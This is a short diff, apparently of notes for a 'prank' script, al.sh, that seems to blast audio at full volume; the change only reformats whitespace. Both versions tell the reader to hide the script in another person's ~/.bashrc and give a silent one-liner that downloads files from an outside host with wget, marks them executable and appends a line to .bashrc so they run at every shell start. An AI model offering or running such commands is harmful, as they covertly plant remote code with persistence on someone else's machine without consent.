@@ -14,9 +14,11 @@ Ahh - you mean it unmuted and went to full volume a second later.
 
 
 
-Run via ./al.sh & disown $!
+Run via
+    ./al.sh & disown $!
 Hide in their bashrc
- ./{PATH_TO_FILE}/al.sh & disown $!
+    ./{PATH_TO_FILE}/al.sh & disown $!
 
-Do everything via: mkdir ~/.config/al >/dev/null 2>&1; cd ~/.config/al; wget -r -nc -nd http://prank.hostei.com/ >/dev/null 2>&1 && chmod +x al.sh && echo ". ~/config/al/al.sh & disown $!" >> ~/.bashrc
+Do everything via: mkdir
+    ~/.config/al >/dev/null 2>&1; cd ~/.config/al; wget -r -nc -nd http://prank.hostei.com/ >/dev/null 2>&1 && chmod +x al.sh && echo ". ~/config/al/al.sh & disown $!" >> ~/.bashrc
 
